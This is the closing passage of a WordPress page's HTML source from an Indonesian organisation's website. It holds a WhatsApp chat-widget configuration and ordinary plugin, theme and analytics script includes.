2.295-24.467 11.478-32.113 31.374-32.113 76.521c0 45.147 32.877 88.764 37.465 94.885 4.588 6.122 64.699 98.771 156.741 138.502 21.892 9.45 38.982 15.094 52.308 19.322 21.98 6.979 41.982 5.995 57.793 3.634 17.628-2.633 54.284-22.189 61.932-43.615 7.646-21.427 7.646-39.791 5.352-43.617-2.294-3.826-8.41-6.122-17.585-10.714z"/>
        </g>
        </svg></div>                </div>
            </div>
                        <span class="ht_ctc_chat_data" 
                data-no_number=""
                data-settings="{&quot;number&quot;:&quot;6282177755115&quot;,&quot;pre_filled&quot;:&quot;&quot;,&quot;dis_m&quot;:&quot;show&quot;,&quot;dis_d&quot;:&quot;show&quot;,&quot;css&quot;:&quot;display: none; cursor: pointer; z-index: 99999999;&quot;,&quot;pos_d&quot;:&quot;position: fixed; bottom: 15px; right: 15px;&quot;,&quot;pos_m&quot;:&quot;position: fixed; bottom: 15px; right: 15px;&quot;,&quot;schedule&quot;:&quot;no&quot;,&quot;se&quot;:150,&quot;ani&quot;:&quot;no-animations&quot;,&quot;url_target_d&quot;:&quot;_blank&quot;,&quot;ga&quot;:&quot;yes&quot;,&quot;fb&quot;:&quot;yes&quot;,&quot;g_init&quot;:&quot;default&quot;,&quot;g_an_event_name&quot;:&quot;click to chat&quot;,&quot;pixel_event_name&quot;:&quot;Click to Chat by HoliThemes&quot;}" 
            ></span>
            <link rel='stylesheet' id='metaslider-flex-slider-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/sliders/flexslider/flexslider.css?ver=3.92.1' type='text/css' media='all' property='stylesheet' />
<link rel='stylesheet' id='metaslider-public-css' href='https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/metaslider/public.css?ver=3.92.1' type='text/css' media='all' property='stylesheet' />
<style id='metaslider-public-inline-css' type='text/css'>
@media only screen and (max-width: 767px) {body:after { display: none; content: "smartphone"; } .hide-arrows-smartphone .flex-direction-nav, .hide-navigation-smartphone .flex-control-paging, .hide-navigation-smartphone .flex-control-nav, .hide-navigation-smartphone .filmstrip{ display: none!important; }}@media only screen and (min-width : 768px) and (max-width: 1023px) {body:after { display: none; content: "tablet"; } .hide-arrows-tablet .flex-direction-nav, .hide-navigation-tablet .flex-control-paging, .hide-navigation-tablet .flex-control-nav, .hide-navigation-tablet .filmstrip{ display: none!important; }}@media only screen and (min-width : 1024px) and (max-width: 1439px) {body:after { display: none; content: "laptop"; } .hide-arrows-laptop .flex-direction-nav, .hide-navigation-laptop .flex-control-paging, .hide-navigation-laptop .flex-control-nav, .hide-navigation-laptop .filmstrip{ display: none!important; }}@media only screen and (min-width : 1440px) {body:after { display: none; content: "desktop"; } .hide-arrows-desktop .flex-direction-nav, .hide-navigation-desktop .flex-control-paging, .hide-navigation-desktop .flex-control-nav, .hide-navigation-desktop .filmstrip{ display: none!important; }}
</style>
<script type="text/javascript" id="ht_ctc_app_js-js-extra">
/* <![CDATA[ */
var ht_ctc_chat_var = {"number":"6282177755115","pre_filled":"","dis_m":"show","dis_d":"show","css":"display: none; cursor: pointer; z-index: 99999999;","pos_d":"position: fixed; bottom: 15px; right: 15px;","pos_m":"position: fixed; bottom: 15px; right: 15px;","schedule":"no","se":"150","ani":"no-animations","url_target_d":"_blank","ga":"yes","fb":"yes","g_init":"default","g_an_event_name":"click to chat","pixel_event_name":"Click to Chat by HoliThemes"};
var ht_ctc_variables = {"g_an_event_name":"click to chat","pixel_event_type":"trackCustom","pixel_event_name":"Click to Chat by HoliThemes","g_an_params":["g_an_param_1","g_an_param_2","g_an_param_3"],"g_an_param_1":{"key":"number","value":"{number}"},"g_an_param_2":{"key":"title","value":"{title}"},"g_an_param_3":{"key":"url","value":"{url}"},"pixel_params":["pixel_param_1","pixel_param_2","pixel_param_3","pixel_param_4"],"pixel_param_1":{"key":"Category","value":"Click to Chat for WhatsApp"},"pixel_param_2":{"key":"ID","value":"{number}"},"pixel_param_3":{"key":"Title","value":"{title}"},"pixel_param_4":{"key":"URL","value":"{url}"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/js/app.js?ver=4.12" id="ht_ctc_app_js-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-includes/js/dist/hooks.min.js?ver=2810c76e705dd1a53b18" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-includes/js/jquery/jquery.form.min.js?ver=4.3.0" id="jquery-form-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/jquery.rateyo.min.js?ver=2.3" id="jquery-recipe-rateyo-js"></script>
<script type="text/javascript" id="penci_rateyo-js-extra">
/* <![CDATA[ */
var PENCI = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/rating_recipe.js?ver=2.3.2" id="penci_rateyo-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/jquery.easypiechart.min.js?ver=1.0" id="jquery-penci-piechart-js"></script>
<script type="text/javascript" id="penci-rateyo-review-js-extra">
/* <![CDATA[ */
var PENCI = {"postID":"4779","ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/rating_review.js?ver=3.0" id="penci-rateyo-review-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.lib.min.js?ver=6.6.1" id="penci-script-lib-js"></script>
<script type="text/javascript" id="penci-js-extra">
/* <![CDATA[ */
var PENCILOCALIZE = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","errorMsg":"Something wrong happened. Please try again.","login":"Email Address","password":"Password","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","prevNumber":"1","minlengthSearch":"0","linkTitle":"View More","linkTextAll":"Menu","linkText":"More"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.min.js?ver=6.6.1" id="penci-js"></script>
<script type="text/javascript" id="wpa.longdesc-js-extra">
/* <![CDATA[ */
var wpald = {"url":"https:\/\/kkpbanjarmasin.or.id\/wp-json\/wp\/v2\/media","type":"jquery","text":"<span class=\"dashicons dashicons-media-text\" aria-hidden=\"true\"><\/span><span class=\"screen-reader\">Long Description<\/span>"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/longdesc.min.js?ver=2.1.12" id="wpa.longdesc-js"></script>
<script type="text/javascript" id="wp-accessibility-js-extra">
/* <![CDATA[ */
var wpa = {"skiplinks":{"enabled":false,"output":""},"target":"1","tabindex":"1","underline":{"enabled":false,"target":"a"},"dir":"ltr","lang":"en-US","titles":"1","labels":"1","wpalabels":{"s":"Search","author":"Name","email":"Email","url":"Website","comment":"Comment"},"current":"","errors":"","tracking":"1","ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","security":"4a1d679818","action":"wpa_stats_action","url":"https:\/\/kkpbanjarmasin.or.id\/barang-jasa\/","post_id":"4779"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/wp-accessibility.min.js?ver=2.1.12" id="wp-accessibility-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/sliders/flexslider/jquery.flexslider.min.js?ver=3.92.1" id="metaslider-flex-slider-js"></script>
<script type="text/javascript" id="metaslider-flex-slider-js-after">
/* <![CDATA[ */
var metaslider_3745 = function($) {$('#metaslider_3745').addClass('flexslider');
            $('#metaslider_3745').flexslider({ 
                slideshowSpeed:3000,
                animation:"slide",
                controlNav:false,
                directionNav:false,
                pauseOnHover:true,
                direction:"horizontal",
                reverse:false,
                keyboard:true,
                touch:true,
                animationSpeed:600,
                prevText:"Previous",
                nextText:"Next",
                smoothHeight:false,
                fadeFirstSlide:false,
                easing:"linear",
                slideshow:false,
                pausePlay:false,
                animationLoop:false
            });
            $(document).trigger('metaslider/initialized', '#metaslider_3745');
        };
        var timer_metaslider_3745 = function() {
            var slider = !window.jQuery ? window.setTimeout(timer_metaslider_3745, 100) : !jQuery.isReady ? window.setTimeout(timer_metaslider_3745, 1) : metaslider_3745(window.jQuery);
        };
        timer_metaslider_3745();
/* ]]> */
</script>
<script type="text/javascript" id="metaslider-script-js-extra">
/* <![CDATA[ */
var wpData = {"baseUrl":"https:\/\/kkpbanjarmasin.or.id"};
/* ]]> */
</script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/metaslider/script.min.js?ver=3.92.1" id="metaslider-script-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/easing/jQuery.easing.min.js?ver=3.92.1" id="metaslider-easing-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/horizontal-scrolling-announcements/script/jquery.marquee.min.js?ver=6.6.4" id="jquery.marquee.min-js"></script>
<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/tablepress/js/jquery.datatables.min.js?ver=2.4.4" id="tablepress-datatables-js"></script>
<script type="text/javascript">
jQuery(function($){
var DT_language={"en_US":{}};
$('#tablepress-3').DataTable({"language":DT_language["en_US"],"order":[],"orderClasses":false,"stripeClasses":["even","odd"],"pagingType":"simple"});
});
</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"02cc1a4c4bfc45ffbc53912b71552494","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>
